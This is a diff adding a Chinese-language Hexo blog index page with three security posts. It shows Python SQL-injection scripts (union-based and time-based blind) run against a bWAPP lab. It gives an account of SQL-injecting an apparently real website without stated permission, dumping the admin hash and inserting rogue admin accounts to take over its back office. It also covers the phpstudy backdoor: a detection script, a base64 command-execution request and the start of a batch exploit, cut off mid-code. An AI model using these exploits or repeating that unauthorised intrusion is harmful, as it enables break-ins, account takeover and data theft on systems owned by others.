@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  <link rel="canonical" href="http://yoursite.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <div id="posts" class="posts-expand">
+        <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block home">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/18/python之注入脚本编写/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/10/18/python之注入脚本编写/" class="post-title-link" itemprop="url">python之注入脚本编写</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-18 17:52:35 / 修改时间：19:21:40" itemprop="dateCreated datePublished" datetime="2019-10-18T17:52:35+08:00">2019-10-18</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>一直想学习python，可是老是静不下心。于是我就先定一个小目标，比如先写个盲注脚本出来吧</p>
+<p>先声明一下…………</p>
+<p>这篇文章没有什么技术含量，只是为了记录我学习python的过程，大家就权当看个热闹。。。</p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>我使用的是朋友推荐的一款漏洞平台”bWAPP”进行测试；</p>
+<p>官网链接：<a href="https://sourceforge.net/projects/bwapp/files/latest/download" target="_blank" rel="noopener">https://sourceforge.net/projects/bwapp/files/latest/download</a></p>
+<p>下载好后，解压至自己的phpstudy目录下，并将配置文件config.inc.php中的内容修改为自己电脑的信息</p>
+<p><img src="/2019/10/18/python之注入脚本编写/1.png" alt="1"></p>
+<p>然后访问程序根目录下的install.php即可进行安装</p>
+<p><img src="/2019/10/18/python之注入脚本编写/2.png" alt="2"></p>
+<p>安装好后进入主页，输入默认密码（bee/bug）登陆，可以选择大量的漏洞环境进行练习,我这次选择的是“SQL Injection (GET/Search)”和“SQL Injection - Blind - Time-Based”</p>
+<p><img src="/2019/10/18/python之注入脚本编写/3.png" alt="3"></p>
+<h1 id="0x03-报错注入"><a href="#0x03-报错注入" class="headerlink" title="0x03 报错注入"></a>0x03 报错注入</h1><p>其实这个注入点根本没有写脚本的必要，只是为了练练手，毕竟只有多练习才能更好的去掌握一门语言嘛</p>
+<p>进入漏洞环境，发现一个搜索电影的输入框，参数是title，并且是个注入点</p>
+<p><img src="/2019/10/18/python之注入脚本编写/7.png" alt="7"></p>
+<p>我的目标是使用程序将当前数据库下的所有表名及每个表下的列名爆破出来，开始动手。。。</p>
+<p><strong>代码如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>,<span class="string">"Cookie"</span>:<span class="string">"security_level=0; PHPSESSID=olj0gre29moeh6ksqsibuic1p7"</span>&#125;</span><br><span class="line">tables = [t.strip() <span class="keyword">for</span> t <span class="keyword">in</span> open(<span class="string">'tablename.txt'</span>,<span class="string">'r'</span>).readlines()] <span class="comment">#导入表名字典</span></span><br><span class="line">columns = [c.strip() <span class="keyword">for</span> c <span class="keyword">in</span> open(<span class="string">'columnsname.txt'</span>,<span class="string">'r'</span>).readlines()] <span class="comment">#导入列名字典</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablename</span><span class="params">()</span>:</span></span><br><span class="line">    tab = []</span><br><span class="line">    print(<span class="string">"开始爆破表名!!!"</span>)</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">        url = <span class="string">f"http://www.bwapp.com/sqli_1.php?title=' union select 1,2,3,4,5,6,7 from <span class="subst">&#123;table&#125;</span> -- &amp;action=search"</span></span><br><span class="line">        res = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Error'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tab.append(table)</span><br><span class="line">    <span class="keyword">return</span> tab</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsname</span><span class="params">(tablename)</span>:</span></span><br><span class="line">    col = []</span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        url = <span class="string">f"http://www.bwapp.com/sqli_1.php?title=' union select 1,<span class="subst">&#123;column&#125;</span>,3,4,5,6,7 from <span class="subst">&#123;tablename&#125;</span> -- &amp;action=search"</span></span><br><span class="line">        res = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Error'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            col.append(column)</span><br><span class="line">    <span class="keyword">return</span> col</span><br><span class="line">    </span><br><span class="line">tab = tablename()</span><br><span class="line">print(tab)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tab:</span><br><span class="line">    col = columnsname(i)</span><br><span class="line">    print(<span class="string">f"\n表：<span class="subst">&#123;i&#125;</span>的列名如下："</span> + str(col))</span><br></pre></td></tr></table></figure>
+
+<p>程序运行结果如下</p>
+<p><img src="/2019/10/18/python之注入脚本编写/8.png" alt="8"></p>
+<h1 id="0x04-时间盲注"><a href="#0x04-时间盲注" class="headerlink" title="0x04 时间盲注"></a>0x04 时间盲注</h1><p>进入漏洞环境，又发现一个输入框</p>
+<p><img src="/2019/10/18/python之注入脚本编写/4.png" alt="4"></p>
+<p>搜索框中输入注入语句’ and (select 1 from(select(sleep(3)))x) and ‘aa’ = ‘a，可以看到页面已经延迟了3秒，看来title参数就是注入点</p>
+<p><img src="/2019/10/18/python之注入脚本编写/5.png" alt="5"></p>
+<p>为了练练手，写个脚本进行猜解。</p>
+<p>这里我踩到过一个坑，因为这个平台需要登陆后才能进行测试，所以在headers赋值的时候，一定要加上登陆成功后的cookie信息，不然每次访问都会跳转到/login.php导致无法判断注入点</p>
+<p><strong>代码如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">payloads=<span class="string">"abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_,./"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>,<span class="string">"cookie"</span>:<span class="string">"security_level=0; PHPSESSID=13nie23h4fdbd0okt5meuqq8s3"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">        url = <span class="string">f"http://www.bwapp.com/sqli_15.php?title=1' and (select 1 from(select substring((select database()) from <span class="subst">&#123;i&#125;</span> for 1)='<span class="subst">&#123;payload&#125;</span>' and sleep(3))x) and 'f' ='f&amp;action=search"</span></span><br><span class="line">        s = time.time()</span><br><span class="line">        response = requests.get(url,headers=headers)</span><br><span class="line">        s1 = time.time()</span><br><span class="line">        <span class="keyword">if</span> s1-s &gt; <span class="number">2.9</span>:</span><br><span class="line">            name += payload</span><br><span class="line">            print(<span class="string">'[+]'</span> + name)</span><br><span class="line">           </span><br><span class="line">print(<span class="string">f'\n[+]爆出的库名为：<span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">url = "http://www.bwapp.com/sqli_15.php?title=1' and (select 1 from(select substring((select database()) from 1 for 1)='b' and sleep(3))x) and 'f' ='f&amp;action=search"</span></span><br><span class="line"><span class="string">payload = "' AND (SELECT 2541 FROM (SELECT(SLEEP(5)))RcGX) AND 'JkvU'='JkvU"</span></span><br><span class="line"><span class="string">start=time.time()</span></span><br><span class="line"><span class="string">response = requests.get(url,headers=headers)</span></span><br><span class="line"><span class="string">start2=time.time()</span></span><br><span class="line"><span class="string">print(start2-start)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>附上一张代码执行后的图片</p>
+<p><img src="/2019/10/18/python之注入脚本编写/6.png" alt="6"></p>
+<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>编写脚本的时候借鉴了一些表哥文章中的思路，我把他们的文章发到下面来，大家一起更好的去学习交流：</p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=50914&amp;highlight=python" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=50914&amp;highlight=python</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=53226&amp;highlight=python" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=53226&amp;highlight=python</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=52149&amp;highlight=python" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=52149&amp;highlight=python</a></p>
+
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+        <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block home">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/一次有趣的mssql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/10/12/一次有趣的mssql注入/" class="post-title-link" itemprop="url">一次有趣的mssql注入</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-12 10:19:02" itemprop="dateCreated datePublished" datetime="2019-10-12T10:19:02+08:00">2019-10-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-10-16 17:14:13" itemprop="dateModified" datetime="2019-10-16T17:14:13+08:00">2019-10-16</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一次有趣的mssql注入"><a href="#一次有趣的mssql注入" class="headerlink" title="一次有趣的mssql注入"></a>一次有趣的mssql注入</h1><p>无意间发现一处注入点，对其进行漏洞测试</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/1.png" alt="1"></p>
+<p>爆所有库名</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/2.png" alt="2"></p>
+<p>爆出当前库所有表名 dj_hzrobam_com</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/3.png" alt="3"></p>
+<p>爆出密码  admin / md5: d38af30d9780190f18ae7800b54bcbbc</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/4.png" alt="4"></p>
+<p>放入cmd5中进行破解，破解失败</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/5.png" alt="5"></p>
+<p>尝试直接写入一句话到服务器失败，于是尝试通过执行sql语句添加用户到数据库中，从而登陆后台，报错信息显示IDENTITY_INSERT未打开，无法插入数据</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/6.png" alt="6"></p>
+<p>上网查找原因，得知可通过set IDENTITY_INSERT/**/ login ON;语句开启IDENTITY_INSERT设置，再次执行语句，显示正常页面，猜测已成功开启IDENTITY_INSERT</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/7.png" alt="7"></p>
+<p>再次尝试添加用户到数据库中，还是失败了</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/8.png" alt="8"></p>
+<p>于是将两条语句通过;拼接起来再执行</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/9.png" alt="9"></p>
+<p>看出数据库内容，发现成功添加test用户</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/10.png" alt="10"></p>
+<p>使用插入的用户test登陆失败，</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/11.png" alt="11"></p>
+<p>在重置密码界面重置密码为123456</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/12.png" alt="12"></p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/13.png" alt="13"></p>
+<p>再次登陆依然失败，猜测登陆失败的原因可能与logSort、logState两个参数有关，于是重新写入用户simple/Aa123456，将logSort、logState列设为1</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/15.png" alt="15"></p>
+<p>成功进入后台管理界面</p>
+<p><img src="/2019/10/12/一次有趣的mssql注入/16.png" alt="16"></p>
+<p>这是一年前的一次测试过程，技术含量不高，但整个过程花了我差不多3天，可能是我太菜了，中间存在各种各样的错误，在我断断续续的测试中，最后还是成功进入了后台，所以，还是要多坚持，才能有突破</p>
+
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+        <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block home">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/25/phpstudy后门事件/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/09/25/phpstudy后门事件/" class="post-title-link" itemprop="url">phpstudy后门事件</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-25 17:31:14 / 修改时间：17:32:36" itemprop="dateCreated datePublished" datetime="2019-09-25T17:31:14+08:00">2019-09-25</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="phpstudy后门批量检测及利用"><a href="#phpstudy后门批量检测及利用" class="headerlink" title="phpstudy后门批量检测及利用"></a>phpstudy后门批量检测及利用</h2><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>9月20号得知，phpstudy软件程序包自带PHP的php_xmlrpc.dll模块隐藏有后门。除了反向连接木马之外，还可以正向执行任意代码。</p>
+<p><strong>检测脚本：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">#__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">#__blog__=&apos;http://pcat.cc&apos;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def strings(file) :</span><br><span class="line">    chars = string.printable[:94]</span><br><span class="line">    shortestReturnChar = 4</span><br><span class="line">    regExp = &apos;[%s]&#123;%d,&#125;&apos; % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.compile(regExp)</span><br><span class="line">    with open(file, &apos;rb&apos;) as f:</span><br><span class="line">        return pattern.findall(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def grep(lines,pattern):</span><br><span class="line">    for line in lines:</span><br><span class="line">        if pattern in line:</span><br><span class="line">            yield line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pcheck(filename):</span><br><span class="line">    # trojan feature</span><br><span class="line">    trojan=&apos;@eval&apos;</span><br><span class="line">    # just check dll file</span><br><span class="line">    if filename.endswith(&apos;.dll&apos;):        </span><br><span class="line">        lines=strings(filename)</span><br><span class="line">        try:</span><br><span class="line">            grep(lines,trojan).next()</span><br><span class="line">        except:</span><br><span class="line">            return</span><br><span class="line">        print &apos;=== &#123;0&#125; ===&apos;.format(filename)</span><br><span class="line">        for line in grep(lines,trojan):</span><br><span class="line">            print line</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    # . stand for current directory</span><br><span class="line">    for path, dirs, files in os.walk(&quot;.&quot;, topdown=False):</span><br><span class="line">        for name in files:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">        for name in dirs:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    foo()</span><br></pre></td></tr></table></figure>
+
+<p>将脚本放在phpstudy根目录可递归检测根目录下所有文件。</p>
+<p><img src="/2019/09/25/phpstudy后门事件/1.png" alt></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>后门包</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>访问漏洞环境下任意php文件，添加请求包accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7（base64编码），可执行系统命令</p>
+<p><img src="/2019/09/25/phpstudy后门事件/2.png" alt></p>
+<h4 id="批量检测exp"><a href="#批量检测exp" class="headerlink" title="批量检测exp"></a>批量检测exp</h4><p><img src="/2019/09/25/phpstudy后门事件/3.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">#-*- encoding:utf-8 -*-</span><br><span class="line"># 卿 博客:https://www.cnblogs.com/-qing-/</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import threadpool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;======Phpstudy Backdoor Exploit============\n&quot;)</span><br><span class="line">print(&quot;===========By  Qing=================\n&quot;)</span><br><span class="line">print(&quot;=====Blog：https://www.cnblogs.com/-qing-/==\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_shell(url):</span><br><span class="line">    payload = &quot;echo \&quot;qing\&quot;;&quot;</span><br><span class="line">    payload = base64.b64encode(payload.encode(&apos;utf-8&apos;))</span><br><span class="line">    payload = str(payload, &apos;utf-8&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">    &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;,</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&apos;,</span><br><span class="line">    &apos;Accept&apos;: 